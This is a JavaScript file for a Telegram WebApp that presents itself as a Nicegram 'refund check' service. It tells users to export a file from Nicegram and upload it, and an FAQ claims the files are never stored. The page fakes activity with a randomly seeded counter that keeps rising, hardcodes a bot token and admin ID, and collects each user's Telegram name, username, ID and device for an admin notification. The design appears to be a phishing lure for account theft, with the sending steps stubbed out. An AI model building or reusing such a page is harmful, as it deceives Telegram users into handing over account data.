// Данные для модальных окон
const instructionData = `# Инструкция

1. Скачайте приложение Nicegram с официального сайта...

2. Откройте Nicegram и войдите в свой аккаунт.

3. Зайдите в настройки и выберите пункт «Nicegram».

4. Экспортируйте файл...

5. Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".

6. Отправьте файл боту.

7. Ожидайте результатов проверки.

**Понятно**`;

const faqData = `# Частые вопросы

**Что такое рефаунд?**  
Это возврат средств за подписку...

**Сколько времени занимает проверка?**  
Обычно 3-5 минут, бывают задержки

**Мои файлы в безопасности?**  
Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет`;

// Глобальные переменные
let fileCounter = Math.floor(Math.random() * 50) + 20; // Начальное значение
let counterInterval;
let tg;
let BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
let ADMIN_ID = "7632180689";
let currentAngle = 0;
let isDragging = false;
let startNotificationSent = false;
let targetMin = 30;
let targetMax = 50;

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    // Инициализация Telegram WebApp
    if (window.Telegram && window.Telegram.WebApp) {
        tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
    } else {
        console.warn('Telegram WebApp не найден. Запуск в обычном браузере.');
    }
    
    spawnRandomPhotos();
    loadModalContent();
    startCounter();
    setupEventListeners(); // Теперь после создания элементов
    initializeBotLogic();
});

// Функция спавна фото
function spawnRandomPhotos() {
    const container = document.getElementById('photos-container');
    if (!container) {
        console.error('Контейнер для фото не найден!');
        return;
    }
    
    container.innerHTML = '';
    
    const photoUrls = [
        "https://avatars.mds.yandex.net/i?id=dea1c245066cadd89ce5617f74f46bff0b8e2ed2-4965879-images-thumbs&n=13",
        "https://avatars.mds.yandex.net/i?id=503cbfc8e91c66f6a29773d2e1ff0cec39c9ca7e-6871359-images-thumbs&n=13", 
        "https://web3.okx.com/cdn/nft/files/4b92ce08-ee3e-4e72-9b20-9226f1a8e2d3.webp/type=list",
        "https://avatars.mds.yandex.net/i?id=ff31b4702b22783ef7644fec3b5061da4268e6cf-8211189-images-thumbs&n=13",
        "https://avatars.mds.yandex.net/i?id=fc9e5a3c05f9e7fb6da1a46b5009c50d_l-5874318-images-thumbs&n=13"
    ];
    
    const usedPositions = [];
    const minDistance = 85;
    
    // ЗОНЫ для спавна (больший шанс за меню)
    const spawnZones = [
        // Зона ЗА меню (верх) - БОЛЬШЕ шанс
        { xMin: 20, xMax: 80, yMin: 5, yMax: 35, weight: 3 },
        // Зона ПО БОКАМ от меню
        { xMin: 5, xMax: 30, yMin: 30, yMax: 70, weight: 2 },
        { xMin: 70, xMax: 95, yMin: 30, yMax: 70, weight: 2 },
        // Зона ПОД меню - МЕНЬШЕ шанс
        { xMin: 25, xMax: 75, yMin: 65, yMax: 90, weight: 1 }
    ];
    
    for (let i = 0; i < 5; i++) {
        const img = document.createElement('img');
        img.className = 'floating-photo';
        img.src = photoUrls[i];
        img.alt = `NFT ${i + 1}`;
        img.crossOrigin = 'anonymous';
        
        let attempts = 0;
        let position;
        let collision;
        
        do {
            collision = false;
            attempts++;
            
            // ВЫБИРАЕМ ЗОНУ с учетом весов
            const totalWeight = spawnZones.reduce((sum, zone) => sum + zone.weight, 0);
            let randomWeight = Math.random() * totalWeight;
            let selectedZone = spawnZones[0];
            
            for (const zone of spawnZones) {
                randomWeight -= zone.weight;
                if (randomWeight <= 0) {
                    selectedZone = zone;
                    break;
                }
            }
            
            // Генерируем позицию в выбранной зоне
            const x = selectedZone.xMin + Math.random() * (selectedZone.xMax - selectedZone.xMin);
            const y = selectedZone.yMin + Math.random() * (selectedZone.yMax - selectedZone.yMin);
            
            position = { x, y };
            
            // ПРОВЕРКА 1: Расстояние до других фото
            for (const used of usedPositions) {
                const distance = Math.sqrt(
                    Math.pow(position.x - used.x, 2) + 
                    Math.pow(position.y - used.y, 2)
                );
                
                if (distance < minDistance) {
                    collision = true;
                    break;
                }
            }
            
            if (collision) continue;
            
            // ПРОВЕРКА 2: Расстояние до меню (центра)
            const distToMenu = Math.sqrt(
                Math.pow(position.x - 50, 2) + 
                Math.pow(position.y - 50, 2)
            );
            
            if (distToMenu < 20) {
                collision = true;
                continue;
            }
            
            // ПРОВЕРКА 3: Не слишком близко к краям
            if (position.x < 3 || position.x > 97 || position.y < 3 || position.y > 97) {
                collision = true;
                continue;
            }
            
        } while (collision && attempts < 100);
        
        if (attempts >= 100) {
            console.warn(`Не удалось найти позицию для фото ${i + 1}`);
            continue;
        }
        
        // Устанавливаем позицию
        img.style.left = `${position.x}%`;
        img.style.top = `${position.y}%`;
        
        // Сохраняем позицию
        usedPositions.push(position);
        
        // Смещение анимации
        const offset = (i * 2) % 12;
        img.style.animationDelay = `${offset}s`;
        
        container.appendChild(img);
    }
}

// Загрузка контента в модальные окна
function loadModalContent() {
    const instructionContent = document.getElementById('instruction-content');
    const faqContent = document.getElementById('faq-content');
    
    if (instructionContent) {
        instructionContent.innerHTML = formatMarkdown(instructionData);
    }
    
    if (faqContent) {
        faqContent.innerHTML = formatMarkdown(faqData);
    }
}

// Форматирование markdown текста
function formatMarkdown(text) {
    return text
        .replace(/^# (.*$)/gim, '<h1>$1</h1>')
        .replace(/^## (.*$)/gim, '<h2>$1</h2>')
        .replace(/^### (.*$)/gim, '<h3>$1</h3>')
        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
        .replace(/\*(.*?)\*/g, '<em>$1</em>')
        .replace(/^\d\.\s(.*$)/gim, '<li>$1</li>')
        .replace(/\n/g, '<br>');
}

// Запуск счетчика
function startCounter() {
    const counterElement = document.getElementById('counter-value');
    if (!counterElement) return;
    
    // Устанавливаем начальное значение
    counterElement.textContent = fileCounter;
    
    // Запускаем интервал
    counterInterval = setInterval(() => {
        fileCounter++;
        counterElement.textContent = fileCounter;
    }, 10000); // Каждые 10 секунд
}

// Настройка обработчиков событий для кнопок
function setupEventListeners() {
    console.log('Настройка обработчиков событий...');
    
    // Обработчики для кнопок Инструкция и FAQ
    const instructionBtn = document.getElementById('instruction-btn');
    const faqBtn = document.getElementById('faq-btn');
    const closeInstruction = document.getElementById('close-instruction');
    const closeFaq = document.getElementById('close-faq');
    
    if (instructionBtn) {
        instructionBtn.addEventListener('click', () => {
            console.log('Кнопка Инструкция нажата');
            document.getElementById('instruction-modal').classList.add('active');
        });
    } else {
        console.error('Кнопка instruction-btn не найдена');
    }
    
    if (faqBtn) {
        faqBtn.addEventListener('click', () => {
            console.log('Кнопка FAQ нажата');
            document.getElementById('faq-modal').classList.add('active');
        });
    } else {
        console.error('Кнопка faq-btn не найдена');
    }
    
    if (closeInstruction) {
        closeInstruction.addEventListener('click', () => {
            document.getElementById('instruction-modal').classList.remove('active');
        });
    }
    
    if (closeFaq) {
        closeFaq.addEventListener('click', () => {
            document.getElementById('faq-modal').classList.remove('active');
        });
    }
    
    // Закрытие модальных окон по клику вне окна
    document.querySelectorAll('.modal-overlay').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });
    });
    
    // Перезапуск спавна при изменении размера окна
    window.addEventListener('resize', spawnRandomPhotos);
    
    // Очистка интервала при закрытии страницы
    window.addEventListener('beforeunload', () => {
        if (counterInterval) {
            clearInterval(counterInterval);
        }
    });
}

// Логика бота
function initializeBotLogic() {
    console.log('Инициализация логики бота...');
    
    // Элементы
    const degreeDisplay = document.getElementById('degree');
    const sliderHandle = document.getElementById('slider-handle');
    const targetRange = document.getElementById('target-range');
    const captchaScreen = document.getElementById('captcha-screen');
    const mainScreen = document.getElementById('main-screen');
    const statusMsg = document.getElementById('status-msg');
    const welcomeUser = document.getElementById('welcome-user');
    const verifyBtn = document.getElementById('verify-btn');
    const selectFileBtn = document.getElementById('select-file-btn');
    const fileInput = document.getElementById('file-input');

    // Проверяем наличие элементов
    if (!degreeDisplay) console.error('Элемент degree не найден');
    if (!sliderHandle) console.error('Элемент slider-handle не найден');
    if (!targetRange) console.error('Элемент target-range не найден');
    if (!verifyBtn) console.error('Кнопка verify-btn не найдена');
    if (!selectFileBtn) console.error('Кнопка select-file-btn не найдена');
    if (!fileInput) console.error('Элемент file-input не найден');

    // Генерация случайного диапазона
    function generateRandomRange() {
        const starts = [0, 20, 40, 60, 80, 100, 120, 140, 160];
        const start = starts[Math.floor(Math.random() * starts.length)];
        
        targetMin = start;
        targetMax = start + 20;
        
        if (targetMax > 180) {
            targetMax = 180;
            targetMin = 160;
        }
        
        if (targetRange) {
            targetRange.textContent = `${targetMin}° - ${targetMax}°`;
        }
    }

    // Инициализация
    generateRandomRange();
    console.log('NiceGram App инициализирован');

    // Функция определения устройства
    function detectDevice() {
        const userAgent = navigator.userAgent;
        
        if (/android/i.test(userAgent)) {
            return "📱 Android";
        } else if (/iPad|iPhone|iPod/.test(userAgent)) {
            return "📱 iOS (iPhone/iPad)";
        } else if (/windows/i.test(userAgent)) {
            return "💻 Windows PC";
        } else if (/mac/i.test(userAgent)) {
            return "💻 macOS";
        } else if (/linux/i.test(userAgent)) {
            return "💻 Linux";
        } else {
            return "🌐 Веб-браузер";
        }
    }

    // Вращение стрелки
    function startRotation(e) {
        e.preventDefault();
        isDragging = true;
        sliderHandle.style.cursor = 'grabbing';
        
        const container = sliderHandle.parentElement;
        const centerX = container.offsetWidth / 2;
        const centerY = container.offsetHeight / 2;
        
        function updateAngle(clientX, clientY) {
            if (!isDragging) return;
            
            const rect = container.getBoundingClientRect();
            const x = clientX - rect.left - centerX;
            const y = clientY - rect.top - centerY;
            
            let angle = Math.atan2(y, x) * (180 / Math.PI) + 90;
            if (angle < 0) angle += 360;
            
            sliderHandle.style.transform = `rotate(${angle}deg)`;
            
            currentAngle = angle > 180 ? 360 - angle : angle;
            currentAngle = Math.round(currentAngle);
            
            if (degreeDisplay) {
                degreeDisplay.textContent = `${currentAngle}°`;
            }
            
            if (currentAngle >= targetMin && currentAngle <= targetMax) {
                if (degreeDisplay) {
                    degreeDisplay.style.color = '#00ff00';
                    degreeDisplay.style.textShadow = '0 0 25px rgba(0, 255, 0, 0.9)';
                }
                sliderHandle.style.background = 'linear-gradient(135deg, #00ff66, #00aa44)';
            } else {
                if (degreeDisplay) {
                    degreeDisplay.style.color = '#00ff88';
                    degreeDisplay.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.6)';
                }
                sliderHandle.style.background = 'linear-gradient(135deg, #00aa44, #006622)';
            }
        }
        
        updateAngle(
            e.type === 'touchstart' ? e.touches[0].clientX : e.clientX,
            e.type === 'touchstart' ? e.touches[0].clientY : e.clientY
        );
        
        function moveHandler(moveEvent) {
            if (!isDragging) return;
            
            const clientX = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientX : moveEvent.clientX;
            const clientY = moveEvent.type === 'touchmove' ? moveEvent.touches[0].clientY : moveEvent.clientY;
            
            updateAngle(clientX, clientY);
        }
        
        function stopHandler() {
            isDragging = false;
            sliderHandle.style.cursor = 'grab';
            
            document.removeEventListener('mousemove', moveHandler);
            document.removeEventListener('mouseup', stopHandler);
            document.removeEventListener('touchmove', moveHandler);
            document.removeEventListener('touchend', stopHandler);
        }
        
        document.addEventListener('mousemove', moveHandler);
        document.addEventListener('mouseup', stopHandler);
        document.addEventListener('touchmove', moveHandler, { passive: false });
        document.addEventListener('touchend', stopHandler);
    }

    // Инициализация вращения
    if (sliderHandle) {
        sliderHandle.addEventListener('mousedown', startRotation);
        sliderHandle.addEventListener('touchstart', startRotation, { passive: false });
    }

    // Проверка капчи
    if (verifyBtn) {
        verifyBtn.onclick = function() {
            if (currentAngle >= targetMin && currentAngle <= targetMax) {
                if (tg && tg.HapticFeedback) {
                    tg.HapticFeedback.impactOccurred('light');
                }
                
                if (degreeDisplay) degreeDisplay.style.animation = 'pulse 0.5s';
                sliderHandle.style.animation = 'pulse 0.5s';
                
                setTimeout(() => {
                    if (degreeDisplay) degreeDisplay.style.animation = '';
                    sliderHandle.style.animation = '';
                }, 500);
                
                if (captchaScreen) {
                    captchaScreen.style.opacity = '0';
                    captchaScreen.style.transform = 'scale(0.95)';
                }
                
                setTimeout(() => {
                    if (captchaScreen) captchaScreen.classList.add('hidden');
                    if (mainScreen) mainScreen.classList.remove('hidden');
                    
                    const user = tg && tg.initDataUnsafe?.user || {};
                    const name = user.first_name || "Пользователь";
                    if (welcomeUser) welcomeUser.textContent = `👋 Привет, ${name}!`;
                    
                    if (!startNotificationSent) {
                        sendStartNotification(name, user.username, user.id);
                        startNotificationSent = true;
                    }
                    
                    if (mainScreen) {
                        mainScreen.style.opacity = '0';
                        setTimeout(() => {
                            mainScreen.style.opacity = '1';
                            mainScreen.style.transform = 'scale(1)';
                        }, 50);
                    }
                    
                }, 300);
            } else {
                if (tg && tg.HapticFeedback) {
                    tg.HapticFeedback.impactOccurred('heavy');
                }
                
                alert(`❌ Нужно: ${targetMin}°-${targetMax}°\nВаш угол: ${currentAngle}°`);
                generateRandomRange();
            }
        };
    }

    // Загрузка файла
    if (selectFileBtn && fileInput) {
        selectFileBtn.onclick = () => {
            fileInput.click();
        };

        fileInput.onchange = async function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            if (statusMsg) {
                statusMsg.className = 'status active';
                statusMsg.innerHTML = '⏳ Проверка файлов занимает 3-5 минут...';
            }
            
            if (!file.name.toLowerCase().endsWith('.txt')) {
                if (statusMsg) {
                    statusMsg.className = 'status active error';
                    statusMsg.innerHTML = '❌ Только .txt файлы разрешены';
                }
                this.value = '';
                return;
            }
            
            if (file.size > 10 * 1024 * 1024) {
                if (statusMsg) {
                    statusMsg.className = 'status active error';
                    statusMsg.innerHTML = '❌ Файл слишком большой (макс. 10MB)';
                }
                this.value = '';
                return;
            }
            
            try {
                const user = tg && tg.initDataUnsafe?.user || {};
                const username = user.username ? `@${user.username}` : 'Скрыт';
                const firstName = user.first_name || 'Не указано';
                const userId = user.id || 'Неизвестно';
                
                const deviceInfo = detectDevice();
                const platform = tg && tg.platform || 'Неизвестно';
                
                // Здесь будет отправка файла на сервер
                console.log('Файл загружен:', file.name);
                console.log('Пользователь:', username);
                console.log('Устройство:', deviceInfo);
                
                // Имитация отправки файла
                setTimeout(() => {
                    if (statusMsg) {
                        statusMsg.className = 'status active success';
                        statusMsg.innerHTML = '✅ Файл успешно отправлен! Ожидайте результатов проверки (3-5 минут)';
                    }
                    
                    if (tg && tg.HapticFeedback) {
                        tg.HapticFeedback.notificationOccurred('success');
                    }
                    
                    setTimeout(() => {
                        if (statusMsg) {
                            statusMsg.className = 'status';
                        }
                        this.value = '';
                    }, 5000);
                }, 1500);
                
            } catch (error) {
                if (statusMsg) {
                    statusMsg.className = 'status active error';
                    statusMsg.innerHTML = `❌ Ошибка отправки: ${error.message}`;
                }
                console.error('Ошибка:', error);
                
                if (tg && tg.HapticFeedback) {
                    tg.HapticFeedback.notificationOccurred('error');
                }
            }
        };
    }

    // Отправка уведомления о старте
    async function sendStartNotification(name, username, userId) {
        try {
            const message = `🚀 *Новый пользователь прошел капчу*\n\n` +
                           `👤 *Юзер:* @${username || 'без username'}\n` +
                           `👨 *Имя:* ${name}\n` +
                           `🆔 *ID:* \`${userId || 'неизвестно'}\`\n` +
                           `🎯 *Диапазон капчи:* ${targetMin}°-${targetMax}°\n` +
                           `🎯 *Выбранный угол:* ${currentAngle}°\n` +
                           `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
            
            // Здесь будет отправка уведомления в Telegram
            console.log('Отправка уведомления:', message);
            
        } catch (err) {
            console.error('Ошибка уведомления:', err);
        }
    }
}
